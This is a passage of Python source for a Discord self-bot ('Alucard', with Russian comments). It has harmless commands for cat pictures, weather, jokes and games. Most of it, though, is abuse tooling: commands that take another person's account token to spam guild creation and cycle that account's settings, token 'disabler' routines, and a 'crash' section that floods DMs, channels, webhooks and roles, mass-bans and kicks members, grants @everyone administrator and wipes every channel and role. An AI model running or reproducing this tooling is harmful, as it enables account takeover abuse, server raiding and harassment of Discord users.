
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': None,
        'icon': None,
        'name': "CLOWNEXPLOIT",
        'region': "europe"
    }
    for _i in range(50):
        requests.post('https://discordapp.com/api/v6/guilds',
                      headers=headers, json=guild)
    for _i in range(50):
        try:
            request.patch(
                "https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=payload)
        except Exception as e:
            embed = discord.Embed(
                description=f"{e}",
                color=0xff0000
            )
            await ctx.send(f"*Произошла ошибка:*", embed=embed)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    for _i in range(200):
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        for _i in range(50):
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=setting,
                              timeout=10)
            except Exception as e:
                embed = discord.Embed(
                    description=f"{e}",
                    color=0xff0000
                )
                await ctx.send(f"*Произошла ошибка:*", embed=embed)
            else:
                break


@Alucard.command()
async def disabler(ctx, _token):
    try:

        api = requests.get("https://discordapp.com/api/v6/invite/hwcVZQw")
        data = api.json()
        check = requests.get("https://discordapp.com/api/v6/guilds/" +
                             data['guild']['id'], headers={"Authorization": _token})
        stuff = check.json()
        requests.post("https://discordapp.com/api/v6/invite/hwcVZQw",
                      headers={"Authorization": _token})
        requests.delete("https://discordapp.com/api/v6/guiilds" +
                        data['guild']['id'], headers={"Authorization": _token})
        error553 = f'''
```css
[ Учётная запись успешно отключена. ]
```
'''
        embed = discord.Embed(
            description=error553,
            color=0xff0000
        )
        await ctx.send('*Успех!*', embed=embed)

    except:
        error55 = f'''
```css
[ Что-то пошло не так. ]
```
'''
        embed = discord.Embed(
            description=error55,
            color=0xff0000
        )
        await ctx.send('*Ошибка!*', embed=embed)


@Alucard.command()
async def disablerv2(ctx, _token):
    error123 = f'''
```css
[ Отключаю токен. ]
```
'''
    embed = discord.Embed(
        description=error123,
        color=0xff0000
    )
    await ctx.send('*Попытка.*', embed=embed)
    for x in range(30):
        apilink = "https://discordapp.com/api/v6/invite/r3sSKJJ"
        headers = {
            'Authorization': _token
        }
        requests.post(apilink, headers=headers)
    error1234 = f'''
```css
[ Удалось отключить токен. ]
```
'''
    embed = discord.Embed(
        description=error1234,
        color=0xff0000
    )
    await ctx.send('*Успех.*', embed=embed)

'''
животные
'''


@Alucard.command()
async def sadcat(ctx):
    await ctx.message.delete()
    r = requests.get("https://api.alexflipnote.dev/sadcat").json()
    link = str(r['file'])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"CRACKER_sadcat.png"))
    except:
        await ctx.send(link)


@Alucard.command()
async def cat(ctx):  # b'\xfc'
    await ctx.message.delete()
    if cat_key == 'cat-key-here':
        print(
            f"{Fore.RED}[ERROR]: {Fore.YELLOW}Cat API key has not been set in the config.json file"+Fore.RESET)
    else:
        try:
            req = requests.get(
                f"https://api.thecatapi.com/v1/images/search?format=json&x-api-key={cat_key}")
            r = req.json()
            em = discord.Embed()
            em.set_image(url=str(r[0]["url"]))
            try:
                await ctx.send(embed=em)
            except:
                await ctx.send(str(r[0]["url"]))
        except Exception as e:
            embed = discord.Embed(
                description=f"{e}",
                color=0xff0000
            )
            await ctx.send(f"*Произошла ошибка:*", embed=embed)
        else:
            embed = discord.Embed(
                description=f"*{req.text}*",
                color=0xff0000
            )
            await ctx.send(f"*Произошла ошибка:*", embed=embed)


@Alucard.command()
async def dog(ctx):  # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://dog.ceo/api/breeds/image/random").json()
    em = discord.Embed()
    em.set_image(url=str(r['message']))
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(str(r['message']))


@Alucard.command()
async def fox(ctx):  # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://randomfox.ca/floof/').json()
    em = discord.Embed(title="Random fox image", color=16202876)
    em.set_image(url=r["image"])
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(r['image'])

'''
интерсное
'''


@Alucard.command(aliases=['changehypesquad'])
async def hypesquad(ctx, house):  # b'\xfc'
    await ctx.message.delete()
    request = requests.Session()
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }
    if house == "bravery":
        payload = {'house_id': 1}
    elif house == "brilliance":
        payload = {'house_id': 2}
    elif house == "balance":
        payload = {'house_id': 3}
    elif house == "random":
        houses = [1, 2, 3]
        payload = {'house_id': random.choice(houses)}
    try:
        request.post('https://discordapp.com/api/v6/hypesquad/online',
                     headers=headers, json=payload, timeout=10)
    except Exception as e:
        embed = discord.Embed(
            description=f"{e}",
            color=0xff0000
        )
        await ctx.send(f"*Произошла ошибка:*", embed=embed)


@Alucard.command()
async def webspam(ctx, webhook=None, count=None, message=None):
    if webhook == None:
        error = f'''
```css
[ {ctx.prefix}webspam<webhook>|<кол-во>|<текст>]
```
'''
        embed = discord.Embed(
            description=error,
            color=0xff0000
        )
        await ctx.send('*Вы допустили ошибку в команде:*', embed=embed)
    elif count == None:
        error = f'''
```css
[ {ctx.prefix}webspam<webhook>|<кол-во>|<текст>]
```
'''
        embed = discord.Embed(
            description=error,
            color=0xff0000
        )
        await ctx.send('*Вы допустили ошибку в команде:*', embed=embed)
    elif message == None:
        error = f'''
```css
[ {ctx.prefix}webspam<webhook>|<кол-во>|<текст>]
```
'''
        embed = discord.Embed(
            description=error,
            color=0xff0000
        )
        await ctx.send('*Вы допустили ошибку в команде:*', embed=embed)
    else:
        if int(count) <= 10000:
            count1 = 0
            count3 = 0
            _data = requests.post(webhook, json={'content': message})
            if _data.status_code == 204:
                text = await ctx.send('отправил `0` сообщений')
                for i in range(int(count)):
                    try:
                        if int(count1) <= int(count):
                            time.sleep(0.2)
                            _data = requests.post(
                                webhook, json={'content': message})
                            if _data.status_code == 204:
                                count1 += 1
                                await text.edit(content=f'отправил `{count1}` сообщений')
                        else:
                            await ctx.send(f'Спам окончен! Успешно отправил `{count1}` сообшений')
                            break
                    except Exception as e:
                        if int(count3) == 0:
                            count3 += 1
                            await ctx.send(f'{e}')
                            break
            else:
                error3 = f'''
```css
[ Указана не верная ссылка на вебхук. ]
```
'''
                embed = discord.Embed(
                    description=error3,
                    color=0xff0000
                )
                await ctx.send(f'{ctx.author.mention}, *вы допустили ошибку в команде!*', embed=embed)
        else:
            error2 = f'''
```css
[ Указано число больше 10 000. ]
```
'''
            embed = discord.Embed(
                description=error2,
                color=0xff0000
            )
            await ctx.send(f'{ctx.author.mention}, *вы допустили ошибку в команде!*', embed=embed)


@Alucard.command(aliases=['cs'])
async def clone(ctx):
    if not ctx.guild: return
    timel = time.time()
    guild = ctx.guild
    msglog=ctx.message
    icon_hash = guild.icon
    with open('clone_icon.png', 'wb+') as handle:
        handle.write(rq.get(f'https://cdn.discordapp.com/icons/{guild.id}/{icon_hash}.png').content)
    new_guild = await Alucard.create_guild(name=f'[CLONE] {guild.name}', icon=open('clone_icon.png', 'rb').read())
    for dc in new_guild.channels:
        await dc.delete()
    roles = {}
    r = guild.roles
    r.reverse()
    for role in r:
        if role.is_bot_managed() or role.is_default() or role.is_integration() or role.is_premium_subscriber(): continue
        new_role=await new_guild.create_role(name=role.name, permissions=role.permissions, color=role.color, hoist=role.hoist, mentionable=role.mentionable)
        roles[role] = new_role
    everyone = guild.default_role
    roles[everyone] = new_guild.default_role
    await new_guild.default_role.edit(permissions=everyone.permissions, color=everyone.color, hoist=everyone.hoist, mentionable=everyone.mentionable)
    for dc in await new_guild.fetch_channels():
        await dc.delete()
    channels = {None: None}
    for cat in guild.categories:
        new_c = await new_guild.create_category(name=cat.name, position=cat.position)
        channels[cat] = new_c
    for catt in guild.by_category():
        cat = catt[0]
        chs = catt[1]
        if cat != None:
            for c in chs:
                if c.type==discord.ChannelType.text:
                    new_c = await new_guild.create_text_channel(name=c.name, category=channels[c.category], position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
                elif c.type==discord.ChannelType.voice:
                    new_c = await new_guild.create_voice_channel(name=c.name, category=channels[c.category], position=c.position, user_limit=c.user_limit)
                elif c.type==discord.ChannelType.news:
                    new_c = await new_guild.create_text_channel(name=c.name, category=channels[c.category], position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
                channels[c] = new_c
        else:
            for c in chs:
                if c.type==discord.ChannelType.text:
                    new_c = await new_guild.create_text_channel(name=c.name, category=None, position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
                elif c.type==discord.ChannelType.voice:
                    new_c = await new_guild.create_voice_channel(name=c.name, category=None, position=c.position, user_limit=c.user_limit)
                elif c.type==discord.ChannelType.news:
                    new_c = await new_guild.create_text_channel(name=c.name, category=None, position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
                channels[c] = new_c
    for c in guild.channels:
        overs = c.overwrites
        over_new = {}
        for target,over in overs.items():
            if isinstance(target, discord.Role):
                try:
                    over_new[roles[target]] = over
                except:
                    pass
            else:
                pass
        await channels[c].edit(overwrites=over_new)
    await new_guild.edit(verification_level=guild.verification_level, default_notifications=guild.default_notifications, explicit_content_filter=guild.explicit_content_filter, system_channel=channels[guild.system_channel], system_channel_flags=guild.system_channel_flags, afk_channel=channels[guild.afk_channel], afk_timeout=guild.afk_timeout)#это не оверврайт, но лучше его делать перед эмодзи
    for emoji in guild.emojis:
        try:
            url = f'https://cdn.discordapp.com/emojis/{emoji.id}.{"gif" if emoji.animated else "png"}'
            await new_guild.create_custom_emoji(name=emoji.name, image=rq.get(url).content)
        except:
            pass
    os.remove('clone_icon.png')
    times = int(time.time() - timel)


@Alucard.command(aliases=['invis'])
async def invisible(ctx):
    await ctx.message.delete()
    try:
        name = "‎‎‎‎‎‎‎‏‏‎ ឵឵ ឵឵ ឵឵ ឵឵‎"
        await ctx.author.edit(nick=name)
    except Exception as e:
        await ctx.send(f"Error: {e}")


@Alucard.command()
async def purge(ctx, amount: int):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == Alucard.user).map(
            lambda m: m):
        try:
            await message.delete()
        except:
            pass


@Alucard.command()
async def lmgtfy(ctx, *, message):  # b'\xfc'
    await ctx.message.delete()
    q = urlencode({"q": message})
    await ctx.send(f'<https://lmgtfy.com/?{q}>')


@Alucard.command()
async def encode(ctx, *, string):  # b'\xfc'
    await ctx.message.delete()
    decoded_stuff = base64.b64encode('{}'.format(string).encode('ascii'))
    encoded_stuff = str(decoded_stuff)
    encoded_stuff = encoded_stuff[2:len(encoded_stuff)-1]
    await ctx.send(encoded_stuff)


@Alucard.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
async def geoip(ctx, *, ipaddr: str = '1.3.3.7'):  # b'\xfc'
    await ctx.message.delete()
    r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
    geo = r.json()
    em = discord.Embed()
    fields = [
        {'name': 'IP', 'value': geo['query']},
        {'name': 'ipType', 'value': geo['ipType']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'City', 'value': geo['city']},
        {'name': 'Continent', 'value': geo['continent']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'IPName', 'value': geo['ipName']},
        {'name': 'ISP', 'value': geo['isp']},
        {'name': 'Latitute', 'value': geo['lat']},
        {'name': 'Longitude', 'value': geo['lon']},
        {'name': 'Org', 'value': geo['org']},
        {'name': 'Region', 'value': geo['region']},
        {'name': 'Status', 'value': geo['status']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=True)
    return await ctx.send(embed=em)


@Alucard.command()
async def tweet(ctx, username: str, *, message: str):  # b'\xfc'
    await ctx.message.delete()
    async with aiohttp.ClientSession() as cs:
        async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
            res = await r.json()
            em = discord.Embed()
            em.set_image(url=res["message"])
            await ctx.send(embed=em)


@Alucard.command()
async def decode(ctx, *, string):  # b'\xfc'+
    await ctx.message.delete()
    strOne = (string).encode("ascii")
    pad = len(strOne) % 4
    strOne += b"="*pad
    encoded_stuff = codecs.decode(strOne.strip(), 'base64')
    decoded_stuff = str(encoded_stuff)
    decoded_stuff = decoded_stuff[2:len(decoded_stuff)-1]
    await ctx.send(decoded_stuff)


@Alucard.command()
async def weather(ctx, *, city):  # b'\xfc'
    await ctx.message.delete()
    if weather_key == '':
        print(
            f"{Fore.RED}[ERROR]: {Fore.YELLOW}Weather API key has not been set in the config.json file"+Fore.RESET)
    else:
        try:
            req = requests.get(
                f'http://api.openweathermap.org/data/2.5/weather?q={city}&appid={weather_key}')
            r = req.json()
            temperature = round(float(r["main"]["temp"]) - 273.15, 1)
            lowest = round(float(r["main"]["temp_min"]) - 273.15, 1)
            highest = round(float(r["main"]["temp_max"]) - 273.15, 1)
            weather = r["weather"][0]["main"]
            humidity = round(float(r["main"]["humidity"]), 1)
            wind_speed = round(float(r["wind"]["speed"]), 1)
            em = discord.Embed(description=f'''
            Temperature: `{temperature}`
            Lowest: `{lowest}`
            Highest: `{highest}`
            Weather: `{weather}`
            Humidity: `{humidity}`
            Wind Speed: `{wind_speed}`
            ''')
            em.add_field(name='City', value=city.capitalize())
            em.set_thumbnail(
                url='https://ak0.picdn.net/shutterstock/videos/1019313310/thumb/1.jpg')
            try:
                await ctx.send(embed=em)
            except:
                await ctx.send(f'''
                Temperature: {temperature}
                Lowest: {lowest}
                Highest: {highest}
                Weather: {weather}
                Humidity: {humidity}
                Wind Speed: {wind_speed}
                City: {city.capitalize()}
                ''')
        except KeyError:
            print(
                f"{Fore.RED}[ERROR]: {Fore.YELLOW}{city} Is not a real city"+Fore.RESET)
        else:
            embed = discord.Embed(
                description=f"{req.text}",
                color=0xff0000
            )
            await ctx.send(f"*Произошла ошибка:*", embed=embed)


@Alucard.command(aliases=['shorteen'])
async def bitly(ctx, *, link):  # b'\xfc'
    await ctx.message.delete()
    if bitly_key == '':
        print(
            f"{Fore.RED}[ERROR]: {Fore.YELLOW}Bitly API key has not been set in the config.json file"+Fore.RESET)
    else:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f'https://api-ssl.bitly.com/v3/shorten?longUrl={link}&domain=bit.ly&format=json&access_token={bitly_key}') as req:
                    r = await req.read()
                    r = json.loads(r)
            new = r['data']['url']
            em = discord.Embed()
            em.add_field(name='Shortened link', value=new, inline=False)
            await ctx.send(embed=em)
        except Exception as e:
            embed = discord.Embed(
                description=f"{e}",
                color=0xff0000
            )
            await ctx.send(f"*Произошла ошибка:*", embed=embed)
        else:
            embed = discord.Embed(
                description=f"{req.text}",
                color=0xff0000
            )
            await ctx.send(f"*Произошла ошибка:*", embed=embed)

'''
статусы
'''


@Alucard.command()
async def competing(ctx, *, text):
    await Alucard.change_presence(activity=discord.Activity(name=text, type=discord.ActivityType.competing))

@Alucard.command()
async def game(ctx, *, lol):
    btc_stream=discord.Game(
        name=lol,
    )
    await Alucard.change_presence(activity=btc_stream)


@Alucard.command()
async def listening(ctx, *, lol):
    await Alucard.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=lol))


@Alucard.command()
async def watching(ctx, *, lol):
    await Alucard.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=lol))


@Alucard.command()
async def stream(ctx, *, lol):
    btc_stream=discord.Streaming(
        name=lol,
        url="https://www.twitch.tv/monstercat",
    )
    await Alucard.change_presence(activity=btc_stream)


@Alucard.command()
async def chp(ctx):
    r=requests.get(
        'https://api.coindesk.com/v1/bpi/currentprice/btc.json').json()
    value=r['bpi']['USD']['rate']
    await asyncio.sleep(3)
    btc_stream=discord.Streaming(
        name="Current BTC price: "+value+"$ USD",
        url="https://www.twitch.tv/monstercat",
    )
    await Alucard.change_presence(activity=btc_stream)


@ tasks.loop(seconds=3)
async def btc_status():
    r=requests.get(
        'https://api.coindesk.com/v1/bpi/currentprice/btc.json').json()
    value=r['bpi']['USD']['rate']
    await asyncio.sleep(3)
    btc_stream=discord.Streaming(
        name="Current BTC price: "+value+"$ USD",
        url="https://www.twitch.tv/monstercat",
    )
    await Alucard.change_presence(activity=btc_stream)


'''
команды краша
'''


@Alucard.command()
async def spamls(ctx, member: discord.Member, text):
    await ctx.message.delete()
    dm=await member.create_dm()
    while True:
        await dm.send(f"{text}")

@Alucard.command()
async def spamall(ctx, *, text):
    await ctx.message.delete()
    channels = ctx.guild.channels
    while True:
        for channel in ctx.guild.text_channels:
            try:
                await channel.send(text)
                await channel.send(text + "ᅠ")
            except:
                pass
            

@Alucard.command()
async def spam(ctx, *, text):
    await ctx.message.delete() #удаляем сообщение пользователя, чтобы не спалился
    while True:
        await ctx.send(text)
        await ctx.send(text + "ᅠ")


@ Alucard.command(continue_context=True)
async def spamchannels(ctx):
    await ctx.message.delete()
    while True:
        char=string.ascii_letters + string.digits
        channelname=''.join((random.choice(char) for i in range(16)))
        guild=ctx.message.guild
        await guild.create_text_channel(name=channelname)


@Alucard.command()
async def nick(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        try:
            await member.edit(nick="кловун")
        except:
            pass


@Alucard.command()
async def admineveryone(ctx):
    await ctx.message.delete()
    role=discord.utils.get(ctx.message.guild.roles, name="@everyone")
    perms=discord.Permissions(administrator=True, permissions=4294967287)
    await role.edit(permissions=perms)


@Alucard.command()
async def rolespam(ctx):
    await ctx.message.delete()
    while True:
        rolename=''.join((random.choice(char) for i in range(10)))
        await ctx.guild.create_role(name=rolename)


@Alucard.command()
async def banall(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        try:
            await member.ban()
        except:
            continue


@Alucard.command()
async def kickall(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        try:
            await member.kick()
        except:
            pass


@Alucard.command()
async def auto(ctx):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            pass
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except:
            pass
    for members in ctx.guild.members:
        try:
            await members.ban()
        except:
            pass


@Alucard.command()
async def clear(ctx, amount=10000):
    await ctx.message.delete()
    await ctx.channel.purge(limit=amount)


@Alucard.command()
async def delchannels(ctx):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            pass


@Alucard.command()
async def delroles(ctx):
    await ctx.message.delete()
    for m in ctx.guild.roles:
        try:
            await m.delete()
        except:
            continue


@Alucard.command()
async def admin(ctx):  # создаем асинхронную фунцию бота
    await ctx.message.delete()
    guild=ctx.guild
    perms=discord.Permissions(administrator=True, permissions=4294967287)
    await guild.create_role(name="new role", permissions=perms)
    role=discord.utils.get(ctx.guild.roles, name="new role")
    user=ctx.message.author
    await user.add_roles(role)


@ Alucard.command(aliases=['reactspam'])
async def reacts(ctx, count=None, reaction=None):
    await ctx.message.delete()
    if count == None or reaction == None:
        randcolor=random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(
            title="CRACKER", description=f"Вы не выбрали кол-во спама или эмодзи.\n{prefix.strip()}spamreact [кол-во, эмодзи]", color=randcolor)

        await ctx.send(embed=embed)
    else:
        async for message in ctx.message.channel.history(limit=int(count)):
            try:
                await message.add_reaction(reaction)
            except:
                pass
'''
комнды игр
'''
@ Alucard.command(aliases=['slots', 'bet'])
async def slot(ctx):  # b'\xfc'
    await ctx.message.delete()
    emojis="🍎🍊🍐🍋🍉🍇🍓🍒"
    a=random.choice(emojis)
    b=random.choice(emojis)
    c=random.choice(emojis)
    slotmachine=f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"
    if (a == b == c):
        await ctx.send(embed=discord.Embed.from_dict({"title": "Slot machine", "description": f"{slotmachine} All matchings, you won!"}))
    elif (a == b) or (a == c) or (b == c):
        await ctx.send(embed=discord.Embed.from_dict({"title": "Slot machine", "description": f"{slotmachine} 2 in a row, you won!"}))
    else:
        await ctx.send(embed=discord.Embed.from_dict({"title": "Slot machine", "description": f"{slotmachine} No match, you lost"}))

@Alucard.command()
async def minesweeper(ctx, size: int=5):  # b'\xfc'
    await ctx.message.delete()
    size=max(min(size, 8), 2)
    bombs=[[random.randint(0, size - 1), random.randint(0, size - 1)]
             for x in range(int(size - 1))]

    def is_on_board(x, y): return 0 <= x < size and 0 <= y < size
    def has_bomb(x, y): return [i for i in bombs if i[0] == x and i[1] == y]
    message="**Click to play**:\n"
    for y in range(size):
        for x in range(size):
            tile="||{}||".format(chr(11036))
            if has_bomb(x, y):
                tile="||{}||".format(chr(128163))
            else:
                count=0
                for xmod, ymod in m_offets:
                    if is_on_board(x + xmod, y + ymod) and has_bomb(x + xmod, y + ymod):
                        count += 1
                if count != 0:
                    tile="||{}||".format(m_numbers[count - 1])
            message += tile
        message += "\n"
    await ctx.send(message)

'''
Фановые команды
'''
@Alucard.command()
async def joke(ctx):  # b'\xfc'
    await ctx.message.delete()
    headers={
        "Accept": "application/json"
    }
    async with aiohttp.ClientSession()as session:
        async with session.get("https://icanhazdadjoke.com", headers=headers) as req:
            r=await req.json()
    await ctx.send(r["joke"])

@Alucard.command()
async def combine(ctx, name1, name2):  # b'\xfc'
    await ctx.message.delete()
    name1letters=name1[:round(len(name1) / 2)]
    name2letters=name2[round(len(name2) / 2):]
    ship="".join([name1letters, name2letters])
    emb=(discord.Embed(description=f"{ship}"))
    emb.set_author(name=f"{name1} + {name2}")
    await ctx.send(embed=emb)


@ Alucard.command(name='say', aliases=['speak'])
async def say(ctx, *, text):  # b'\xfc'
    await ctx.message.delete()
    text=text.replace('a', '4').replace('A', '4').replace('e', '3').replace('е', '3')\
        .replace('E', '3').replace('i', '!').replace('I', '!')\
        .replace('o', '0').replace('O', '0').replace('u', '|_|').replace('U', '|_|')
    await ctx.send(f'`{text}`')


@Alucard.command(aliases=['dong', 'penis'])
async def dick(ctx, *, user: discord.Member=None):  # b'\xfc
    await ctx.message.delete()
    topchels = ["760899937482833981", "532886707612286977", "610453921726595082"]
    if user is None:
        user=ctx.author
        userid = ctx.author.id
    else:
        userid = user.id
    if str(userid) in topchels:
        dong="==============="
        size = "15"
    else:
        dong=""
        size=random.randint(1, 15)
        dong=""
        for _i in range(0, size):
            dong += "="
    em=discord.Embed(title=f"{user}'s Dick size", description=f"8{dong}D ({size}см)", colour=0x0000)
    await ctx.send(embed=em)


@Alucard.command(aliases=['editspam', 'massedit'])
async def edit(ctx, count=None, *, mesg=None):
    await ctx.message.delete()
    if count == None or mesg == None:
        randcolor=random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title="CRACKER - Редактирование сообщений",
                              description=f"Вы не ввели кол-во сообщений или текст для замены.\n{prefix.strip()}Редактирование [кол-во] [текст]", color=randcolor)

        await ctx.send(embed=embed)
    else:
        edited=0
        randcolor=random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(
            title="CRACKER", description=f"Редактирование прошло успешно.", color=randcolor)
        msg=await ctx.send(embed=embed)
        async for message in ctx.channel.history(limit=int(count)):
            try:
                if message.author == Alucard.user:
                    if message != msg:
                        await message.edit(content=mesg, embed=None)
                        edited=edited + 1
            except:
                pass


@ Alucard.command(aliases=['hspam'])
async def ghostspam(ctx):
    await ctx.message.delete()
    await ctx.send("||" + '\n' * 1996 + '||')


@Alucard.command()
async def flex(ctx):
    await ctx.message.delete()
    message=await ctx.send("""```
    ⣀⣤
⠀⠀⠀⠀⣿⠿⣶
⠀⠀⠀⠀⣿⣿⣀
⠀⠀⠀⣶⣶⣿⠿⠛⣶
⠤⣀⠛⣿⣿⣿⣿⣿⣿⣭⣿⣤
⠒⠀⠀⠀⠉⣿⣿⣿⣿⠀⠀⠉⣀
⠀⠤⣤⣤⣀⣿⣿⣿⣿⣀⠀⠀⣿
⠀⠀⠛⣿⣿⣿⣿⣿⣿⣿⣭⣶⠉
⠀⠀⠀⠤⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⣭⣿⣿⣿⠀⣿⣿⣿
⠀⠀⠀⣉⣿⣿⠿⠀⠿⣿⣿
⠀⠀⠀⠀⣿⣿⠀⠀⠀⣿⣿⣤
⠀⠀⠀⣀⣿⣿⠀⠀⠀⣿⣿⣿
⠀⠀⠀⣿⣿⣿⠀⠀⠀⣿⣿⣿
⠀⠀⠀⣿⣿⠛⠀⠀⠀⠉⣿⣿
⠀⠀⠀⠉⣿⠀⠀⠀⠀⠀⠛⣿
⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⣿⣿
⠀⠀⠀⠀⣛⠀⠀⠀⠀⠀⠀⠛⠿⠿⠿
⠀⠀⠀⠛⠛
```""")
    await asyncio.sleep(1)
    await message.edit(content="""```
   ⣀⣶⣀
⠀⠀⠀⠒⣛⣭
⠀⠀⠀⣀⠿⣿⣶
⠀⣤⣿⠤⣭⣿⣿
⣤⣿⣿⣿⠛⣿⣿⠀⣀
⠀⣀⠤⣿⣿⣶⣤⣒⣛
⠉⠀⣀⣿⣿⣿⣿⣭⠉
⠀⠀⣭⣿⣿⠿⠿⣿
⠀⣶⣿⣿⠛⠀⣿⣿
⣤⣿⣿⠉⠤⣿⣿⠿
⣿⣿⠛⠀⠿⣿⣿
⣿⣿⣤⠀⣿⣿⠿
⠀⣿⣿⣶⠀⣿⣿⣶
⠀⠀⠛⣿⠀⠿⣿⣿
⠀⠀⠀⣉⣿⠀⣿⣿
⠀⠶⣶⠿⠛⠀⠉⣿
⠀⠀⠀⠀⠀⠀⣀⣿
⠀⠀⠀⠀⠀⣶⣿⠿
```""")
    await asyncio.sleep(1)
    await message.edit(content="""```
⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⠶⠀⠀⣀⣀
⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣶⣿⣿⣿⣿⣿⣿
⠀⠀⣀⣶⣤⣤⠿⠶⠿⠿⠿⣿⣿⣿⣉⣿⣿
⠿⣉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⣤⣿⣿⣿⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿⣶⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⣿⣿⠿⣛⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠛⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⠿⠀⣿⣿⣿⠛
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠿⣿⠀⠀⣿⣶
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠛⠀⠀⣿⣿⣶
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⠤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿
```""")
    await asyncio.sleep(1)
    await message.edit(content="""```
⠀⠀⣀
⠀⠿⣿⣿⣀
⠀⠉⣿⣿⣀
⠀⠀⠛⣿⣭⣀⣀⣤
⠀⠀⣿⣿⣿⣿⣿⠛⠿⣶⣀
⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⣉⣶
⠀⠀⠉⣿⣿⣿⣿⣀⠀⠀⣿⠉
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿
⠀⣀⣿⣿⣿⣿⣿⣿⣿⣿⠿
⠀⣿⣿⣿⠿⠉⣿⣿⣿⣿
⠀⣿⣿⠿⠀⠀⣿⣿⣿⣿
⣶⣿⣿⠀⠀⠀⠀⣿⣿⣿
⠛⣿⣿⣀⠀⠀⠀⣿⣿⣿⣿⣶⣀
⠀⣿⣿⠉⠀⠀⠀⠉⠉⠉⠛⠛⠿⣿⣶
⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿
⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉
⣀⣶⣿⠛
```""")
    await asyncio.sleep(1)
    await message.edit(content="""```
⠀⠀⠀⠀⠀⠀⠀⣀⣀
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⣿
⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣶⣿⣿⣿⣶⣶⣤⣶⣶⠶⠛⠉⠉
